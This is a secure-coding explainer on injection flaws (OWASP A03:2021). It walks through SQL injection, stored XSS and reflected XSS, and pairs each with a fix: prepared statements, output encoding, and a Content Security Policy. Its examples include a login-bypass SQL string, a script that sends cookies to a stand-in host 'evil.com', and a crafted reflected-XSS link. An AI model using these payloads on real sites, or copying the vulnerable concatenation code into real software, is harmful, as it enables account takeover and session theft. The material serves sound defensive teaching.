# A03:2021 – Injection

---

## SQL Injection

### The moment it happens

There is a login form at `https://example.com/login` with a username field.

An attacker opens it in a browser and types this into the username field:
```
' OR '1'='1
```
then clicks **Submit**.

The server receives that string as `username` and runs:

```java
String query = "SELECT * FROM users WHERE name = '" + username + "'";
```

Which produces:
```sql
SELECT * FROM users WHERE name = '' OR '1'='1'
```

The DB evaluates this. `'1'='1'` is always true, so the WHERE clause matches every row.
The DB returns all users. The attacker is now logged in as the first user in the table — likely an admin.

**The moment**: when the server glues the attacker's text directly into the SQL string.
The DB receives one string and has no way to know where the developer's SQL ends
and the attacker's input begins.

### Fix

```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");
ps.setString(1, username);
```

The `?` is sent to the DB as a placeholder. The value is sent separately as data, never
as part of the SQL text. The DB parses the query structure first, then binds the value.
No matter what the user types, it can only ever fill a value — not change the query.

---

## XSS — Stored (the most dangerous kind)

### The moment it happens

Your site has a comments section. An attacker posts this comment:
```
Great article! <script>fetch('https://evil.com?c='+document.cookie)</script>
```

Your server saves it to the database as-is — it's just text, the server doesn't execute it.

One hour later, Alice visits the article. Her browser receives the HTML page:

```html
<div class="comment">
  Great article! <script>fetch('https://evil.com?c='+document.cookie)</script>
</div>
```

**The moment**: Alice's browser parses that HTML. It sees `<script>` and executes the code —
because the browser has no idea this text came from a random commenter rather than from you.
It treats everything in a `<script>` tag as trusted developer code.

Alice's session cookie is sent to `evil.com`. The attacker uses it to log in as Alice.

The attacker posted the comment once. They are now stealing the session of every person
who reads that article — potentially thousands of people — without any of them doing anything wrong.

### Fix

Encode before rendering — turn `<` into `&lt;` so the browser shows it as text, never executes it:

```html
<!-- Thymeleaf: th:text encodes automatically -->
<div th:text="${comment}"></div>
<!-- renders as: &lt;script&gt;... — visible text, not code -->

<!-- th:utext skips encoding — NEVER use with user input -->
<div th:utext="${comment}"></div>
```

---

## XSS — Reflected

### The moment it happens

Search page:
```java
// Server puts the search term directly into the HTML response
return "<h1>Results for: " + request.getParameter("q") + "</h1>";
```

Attacker sends victim a link:
```
https://example.com/search?q=<script>stealCookie()</script>
```

Victim clicks. Server reflects the script back in the HTML. Browser executes it.

**The moment**: the server copies raw user input into the response body, and the browser
renders it as HTML. Unlike stored XSS, this payload isn't saved — the attack only works
if the victim clicks the crafted URL. Attackers deliver these via phishing emails.

### Fix

Same as stored: encode the output. One line in Thymeleaf (`th:text`) handles it.
Also add a Content Security Policy header — even if encoding is missed somewhere,
CSP tells the browser to refuse inline scripts entirely:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

---

## The core rule for both

The browser (or DB) gets a string. It cannot tell which parts are "your code" and
which parts are "user data" — unless you make that separation explicit.

- **SQL**: use `?` placeholders — query structure and data travel separately.
- **HTML**: encode output — `<` becomes `&lt;`, so it is always treated as text.

If you mix user data into the command/markup as raw text, you have lost control
of what the interpreter will do.
